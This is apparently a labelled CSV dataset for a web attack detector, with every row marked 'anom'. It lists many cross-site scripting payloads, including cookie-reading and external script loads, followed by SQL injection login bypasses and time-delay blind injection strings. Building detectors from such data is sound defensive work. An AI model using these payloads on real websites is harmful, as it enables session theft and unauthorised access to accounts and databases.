payload,attack_type,label
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>,,anom
"""><script alert(String.fromCharCode(88,83,83))</script>",,anom
'>><marquee><h1>XSS</h1></marquee>,,anom
"'"">><script>alert('XSS')</script>",,anom
"'"">><marquee><h1>XSS</h1></marquee>",,anom
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",,anom
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert('XSS');\"">",,anom
<script>var var = 1; alert(var)</script>,,anom
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",,anom
"<?='<SCRIPT>alert(""XSS"")</SCRIPT>'?>",,anom
"<IMG SRC='vbscript:msgbox(\""XSS\"")'>",,anom
""" onfocus=alert(document.domain) ""> <""",,anom
"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",,anom
"<STYLE>li {list-style-image: url(\""javascript:alert('XSS')\"");}</STYLE><UL><LI>XSS",,anom
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",,anom
"perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS\"")>\"";' > out",,anom
"<br size=\""&{alert('XSS')}\"">",,anom
<scrscriptipt>alert(1)</scrscriptipt>,,anom
</br style=a:expression(alert())>,,anom
</script><script>alert(1)</script>,,anom
"""><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",,anom
[color=red width=expression(alert(123))][color],,anom
"<BASE HREF=""javascript:alert('XSS');//"">",,anom
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,,anom
"""></iframe><script>alert(123)</script>",,anom
"<body onLoad=""while(true) alert('XSS');"">",,anom
"'""></title><script>alert(1111)</script>",,anom
"</textarea>'""><script>alert(document.cookie)</script>",,anom
"'""""><script language=""JavaScript""> alert('X \nS \nS');</script>",,anom
</script></script><<<<script><>>>><<<script>alert(123)</script>,,anom
<html><noalert><noscript>(123)</noscript><script>(123)</script>,,anom
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",,anom
'></select><script>alert(123)</script>,,anom
"'>""><script src = 'http://www.site.com/XSS.js'></script>",,anom
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,,anom
"<SCRIPT>document.write(""XSS"");</SCRIPT>",,anom
"a=""get"";b=""URL"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",,anom
"='><script>alert(""xss"")</script>",,anom
"<script+src="">""+src=""http://yoursite.com/xss.js?69,69""></script>",,anom
"<body background=javascript:'""><script>alert(navigator.userAgent)</script>></body>",,anom
""">/XaDoS/><script>alert(document.cookie)</script><script src=""http://www.site.com/XSS.js""></script>",,anom
""">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>",,anom
"src=""http://www.site.com/XSS.js""></script>",,anom
"data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=",,anom
"!--"" /><script>alert('xss');</script>",,anom
"<script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",,anom
"""><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",,anom
"'""></title><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",,anom
"<img """"""><script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",,anom
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>,,anom
"""><script>alert(1337)</script>""><script>alert(""XSS by \nxss</h1></marquee>",,anom
"'""></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",,anom
"<iframe src=""javascript:alert('XSS by \nxss');""></iframe><marquee><h1>XSS by xss</h1></marquee>",,anom
"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt='",,anom
"""><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=""",,anom
"\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=\'",,anom
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??,,anom
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??,,anom
'); alert('xss'); var x=',,anom
\\'); alert(\'xss\');var x=\',,anom
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",,anom
">""><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>",,anom
"<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",,anom
</body>,,anom
</html>,,anom
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,,anom
<SCRIPT> alert(“XSS”); </SCRIPT>,,anom
"<BODY ONLOAD=alert(""XSS"")>",,anom
"<BODY BACKGROUND=""javascript:alert('XSS')"">",,anom
"<IMG SRC=""javascript:alert('XSS');"">",,anom
"<IMG DYNSRC=""javascript:alert('XSS')"">",,anom
"<IMG LOWSRC=""javascript:alert('XSS')"">",,anom
<IFRAME SRC=”http://hacker-site.com/xss.html”>,,anom
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",,anom
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",,anom
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",,anom
"<TD BACKGROUND=""javascript:alert('XSS')"">",,anom
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",,anom
"<DIV STYLE=""width: expression(alert('XSS'));"">",,anom
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">",,anom
"<EMBED SRC=""http://hacker.com/xss.swf"" AllowScriptAccess=""always"">",,anom
"&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",,anom
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()},,anom
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;,,anom
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;,,anom
"&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;",,anom
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;,,anom
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,anom
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,,anom
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,,anom
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,,anom
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;,,anom
&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;,,anom
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E,,anom
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onafterprint=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onbeforeprint=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onbeforeunload=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onhashchange=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onmessage=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onoffline=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onpagehide=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onpageshow=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onpopstate=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onresize=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onunload=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onblur=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onchange=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x oncontextmenu=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x oninput=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x oninvalid=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onreset=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onsearch=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onselect=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onkeydown=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onkeypress=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onkeyup=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onclick=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondblclick=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onmousemove=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onmouseout=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onmouseover=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onmouseup=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onmousewheel=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondrag=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondragend=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondragenter=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondragleave=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondragover=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondragstart=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondrop=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onscroll=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x oncopy=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x oncut=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onpaste=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onabort=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x oncanplay=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x oncanplaythrough=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x oncuechange=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ondurationchange=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onemptied=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onended=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onerror=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onloadeddata=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onloadedmetadata=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onloadstart=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onpause=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onplay=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onplaying=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onprogress=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onratechange=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onseeked=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onseeking=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onstalled=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onsuspend=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ontimeupdate=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onvolumechange=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onwaiting=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x onshow=""alert(String.fromCharCode(88,83,83))"">",,anom
"<IMG SRC=x ontoggle=""alert(String.fromCharCode(88,83,83))"">",,anom
"<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow=""alert(1)"";",,anom
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",,anom
"<INPUT TYPE=""BUTTON"" action=""alert('XSS')""/>",,anom
"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",,anom
"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",,anom
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",,anom
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",,anom
"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",,anom
"""></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder=""0%EF%BB%BF",,anom
"""><h1><IFRAME width=""420"" height=""315"" SRC=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",,anom
"""><h1><iframe width=""420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",,anom
"><h1><IFRAME width=""420"" height=""315"" frameborder=""0"" onmouseover=""document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr",,anom
"g'""></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250",,anom
"<IFRAME width=""420"" height=""315"" frameborder=""0"" onload=""alert(document.cookie)""></IFRAME>",,anom
"""><h1><IFRAME SRC=""javascript:alert('XSS');""></IFRAME>"">123</h1>",,anom
"""><h1><IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>123</h1>",,anom
<iframe src=http://xss.rocks/scriptlet.html <,,anom
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",,anom
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",,anom
"<iframe src=""&Tab;javascript:prompt(1)&Tab;"">",,anom
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',,anom
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",,anom
<sVg><scRipt >alert&lpar;1&rpar; {Opera},,anom
<img/src=`` onerror=this.onerror=confirm(1) ,,anom
"<form><isindex formaction=""javascript&colon;confirm(1)""",,anom
<img src=``&NewLine; onerror=alert(1)&NewLine;,,anom
'-',,anom
' ',,anom
'&',,anom
'^',,anom
'*',,anom
' or ''-',,anom
' or '' ',,anom
' or ''&',,anom
' or ''^',,anom
' or ''*',,anom
"""-""",,anom
""" """,,anom
"""&""",,anom
"""^""",,anom
"""*""",,anom
""" or """"-""",,anom
""" or """" """,,anom
""" or """"&""",,anom
""" or """"^""",,anom
""" or """"*""",,anom
or true--,,anom
""" or true--",,anom
' or true--,,anom
""") or true--",,anom
') or true--,,anom
' or 'x'='x,,anom
') or ('x')=('x,,anom
')) or (('x'))=(('x,,anom
""" or ""x""=""x",,anom
""") or (""x"")=(""x",,anom
""")) or ((""x""))=((""x",,anom
or 1=1,,anom
or 1=1--,,anom
or 1=1#,,anom
or 1=1/*,,anom
admin' --,,anom
admin' #,,anom
admin'/*,,anom
admin' or '1'='1,,anom
admin' or '1'='1'--,,anom
admin' or '1'='1'#,,anom
admin' or '1'='1'/*,,anom
admin'or 1=1 or ''=',,anom
admin' or 1=1,,anom
admin' or 1=1--,,anom
admin' or 1=1#,,anom
admin' or 1=1/*,,anom
admin') or ('1'='1,,anom
admin') or ('1'='1'--,,anom
admin') or ('1'='1'#,,anom
admin') or ('1'='1'/*,,anom
admin') or '1'='1,,anom
admin') or '1'='1'--,,anom
admin') or '1'='1'#,,anom
admin') or '1'='1'/*,,anom
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",,anom
"admin"" --",,anom
"admin"" #",,anom
"admin""/*",,anom
"admin"" or ""1""=""1",,anom
"admin"" or ""1""=""1""--",,anom
"admin"" or ""1""=""1""#",,anom
"admin"" or ""1""=""1""/*",,anom
"admin""or 1=1 or """"=""",,anom
"admin"" or 1=1",,anom
"admin"" or 1=1--",,anom
"admin"" or 1=1#",,anom
"admin"" or 1=1/*",,anom
"admin"") or (""1""=""1",,anom
"admin"") or (""1""=""1""--",,anom
"admin"") or (""1""=""1""#",,anom
"admin"") or (""1""=""1""/*",,anom
"admin"") or ""1""=""1",,anom
"admin"") or ""1""=""1""--",,anom
"admin"") or ""1""=""1""#",,anom
"admin"") or ""1""=""1""/*",,anom
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",,anom
 waitfor delay '0:0:20' /* ,,anom
 waitfor delay '0:0:20' --,,anom
' waitfor delay '0:0:20' /* ,,anom
' waitfor delay '0:0:20' --,,anom
""" waitfor delay '0:0:20' /* ",,anom
""" waitfor delay '0:0:20' --",,anom
) waitfor delay '0:0:20' /* ,,anom
) waitfor delay '0:0:20' --,,anom
)) waitfor delay '0:0:20' /* ,,anom
)) waitfor delay '0:0:20' --,,anom
))) waitfor delay '0:0:20' /* ,,anom
))) waitfor delay '0:0:20' --,,anom
)))) waitfor delay '0:0:20' /* ,,anom
)))) waitfor delay '0:0:20' --,,anom
))))) waitfor delay '0:0:20' --,,anom
)))))) waitfor delay '0:0:20' --,,anom
') waitfor delay '0:0:20' /* ,,anom
') waitfor delay '0:0:20' --,,anom
""") waitfor delay '0:0:20' /* ",,anom
""") waitfor delay '0:0:20' --",,anom
')) waitfor delay '0:0:20' /* ,,anom
')) waitfor delay '0:0:20' --,,anom
""")) waitfor delay '0:0:20' /* ",,anom
""")) waitfor delay '0:0:20' --",,anom
'))) waitfor delay '0:0:20' /* ,,anom
'))) waitfor delay '0:0:20' --,,anom
"""))) waitfor delay '0:0:20' /* ",,anom
"""))) waitfor delay '0:0:20' --",,anom
')))) waitfor delay '0:0:20' /* ,,anom
')))) waitfor delay '0:0:20' --,,anom
""")))) waitfor delay '0:0:20' /* ",,anom
""")))) waitfor delay '0:0:20' --",,anom
'))))) waitfor delay '0:0:20' /* ,,anom
'))))) waitfor delay '0:0:20' --,,anom
"""))))) waitfor delay '0:0:20' /* ",,anom
"""))))) waitfor delay '0:0:20' --",,anom
')))))) waitfor delay '0:0:20' /* ,,anom
')))))) waitfor delay '0:0:20' --,,anom
""")))))) waitfor delay '0:0:20' /* ",,anom
""")))))) waitfor delay '0:0:20' --",,anom
